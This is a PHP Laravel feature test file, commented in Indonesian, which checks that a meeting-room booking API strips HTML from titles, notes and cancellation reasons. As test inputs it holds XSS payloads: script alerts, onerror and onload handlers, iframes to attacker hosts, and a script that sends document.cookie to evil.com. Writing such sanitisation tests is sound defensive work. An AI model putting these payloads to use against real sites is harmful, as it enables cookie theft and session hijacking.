<?php

namespace Tests\Feature;

use App\Models\Booking;
use App\Models\Room;
use App\Models\User;
use Carbon\Carbon;
use Illuminate\Foundation\Testing\RefreshDatabase;
use Tests\TestCase;

/**
 * Audit 496 Parameter 51: Sanitasi Input Judul & Agenda Rapat terhadap XSS.
 * Terapkan sanitasi input strip_tags atau htmlspecialchars pada judul dan agenda rapat sebelum disimpan.
 */
class BookingXssSanitizationAuditTest extends TestCase
{
    use RefreshDatabase;

    private function getNextWorkingSlot(): array
    {
        $start = Carbon::now('Asia/Makassar')
            ->nextWeekday()
            ->setTime(10, 0)
            ->setTimezone(config('app.timezone'));

        $end = (clone $start)->addHours(2);

        return [
            'start' => $start,
            'end'   => $end,
        ];
    }

    public function test_booking_creation_strips_xss_tags_from_title_and_notes(): void
    {
        $employee = User::factory()->create(['role' => 'karyawan']);
        $room = Room::factory()->create(['is_active' => true, 'capacity' => 10]);
        $slot = $this->getNextWorkingSlot();

        $xssTitle = '<script>alert("xss")</script>Rapat Koordinasi Divisi IT';
        $xssNotes = '<img src=x onerror=alert(1)><b>Agenda Pembahasan:</b> Roadmap Q4 <iframe src="https://attacker.com"></iframe>';

        $payload = [
            'room_id'           => $room->id,
            'title'             => $xssTitle,
            'participant_count' => 5,
            'start_time'        => $slot['start']->toDateTimeString(),
            'end_time'          => $slot['end']->toDateTimeString(),
            'notes'             => $xssNotes,
        ];

        $response = $this->actingAs($employee)
            ->postJson('/api/v1/bookings', $payload);

        $response->assertStatus(201);

        $booking = Booking::latest('id')->first();
        $this->assertNotNull($booking);

        // Assert no HTML script/img/iframe tags stored
        $this->assertStringNotContainsString('<script>', $booking->title);
        $this->assertStringNotContainsString('</script>', $booking->title);
        $this->assertSame('alert("xss")Rapat Koordinasi Divisi IT', $booking->title);

        $this->assertStringNotContainsString('<img', $booking->notes);
        $this->assertStringNotContainsString('<b>', $booking->notes);
        $this->assertStringNotContainsString('<iframe>', $booking->notes);
        $this->assertSame('Agenda Pembahasan: Roadmap Q4', $booking->notes);
    }

    public function test_booking_update_strips_xss_tags_from_title_and_notes(): void
    {
        $employee = User::factory()->create(['role' => 'karyawan']);
        $room = Room::factory()->create(['is_active' => true, 'capacity' => 10]);
        $slot = $this->getNextWorkingSlot();

        $booking = Booking::factory()->create([
            'user_id'    => $employee->id,
            'room_id'    => $room->id,
            'title'      => 'Judul Asli Bersih',
            'notes'      => 'Catatan Asli Bersih',
            'start_time' => $slot['start']->toDateTimeString(),
            'end_time'   => $slot['end']->toDateTimeString(),
            'status'     => 'pending',
        ]);

        $xssTitle = '<svg/onload=alert("XSS")>Judul Pembaruan Rapat';
        $xssNotes = '<a href="javascript:alert(1)">Klik Disini</a> Catatan Baru Agenda';

        $response = $this->actingAs($employee)
            ->putJson("/api/v1/bookings/{$booking->id}", [
                'room_id'           => $room->id,
                'title'             => $xssTitle,
                'participant_count' => 4,
                'start_time'        => $slot['start']->toDateTimeString(),
                'end_time'          => $slot['end']->toDateTimeString(),
                'notes'             => $xssNotes,
            ]);

        $response->assertOk();

        $booking->refresh();
        $this->assertStringNotContainsString('<svg', $booking->title);
        $this->assertSame('Judul Pembaruan Rapat', $booking->title);

        $this->assertStringNotContainsString('<a href', $booking->notes);
        $this->assertSame('Klik Disini Catatan Baru Agenda', $booking->notes);
    }

    public function test_booking_cancel_strips_xss_from_cancellation_reason(): void
    {
        $employee = User::factory()->create(['role' => 'karyawan']);
        $booking = Booking::factory()->create([
            'user_id' => $employee->id,
            'status'  => 'pending',
        ]);

        $xssReason = '<script>fetch("https://evil.com/steal?cookie="+document.cookie)</script>Pembatalan karena manajer berhalangan hadir.';

        $response = $this->actingAs($employee)
            ->patchJson("/api/v1/bookings/{$booking->id}/cancel", [
                'cancellation_reason' => $xssReason,
            ]);

        $response->assertOk();

        $booking->refresh();
        $this->assertStringNotContainsString('<script>', $booking->cancellation_reason);
        $this->assertSame('fetch("https://evil.com/steal?cookie="+document.cookie)Pembatalan karena manajer berhalangan hadir.', $booking->cancellation_reason);
    }

    public function test_booking_model_attribute_mutators_directly_strip_xss(): void
    {
        $booking = new Booking();
        $booking->title = '<script>evil()</script>Rapat Direksi';
        $booking->notes = '<b>Poin 1:</b> Evaluasi kinerja <img src=x onerror=attack()>';
        $booking->cancellation_reason = '<b>Alasan dibatalkan resmi</b>';
        $booking->approval_notes = '<iframe src="attacker.site"></iframe>Catatan persetujuan admin';

        $this->assertSame('evil()Rapat Direksi', $booking->title);
        $this->assertSame('Poin 1: Evaluasi kinerja', $booking->notes);
        $this->assertSame('Alasan dibatalkan resmi', $booking->cancellation_reason);
        $this->assertSame('Catatan persetujuan admin', $booking->approval_notes);
    }
}
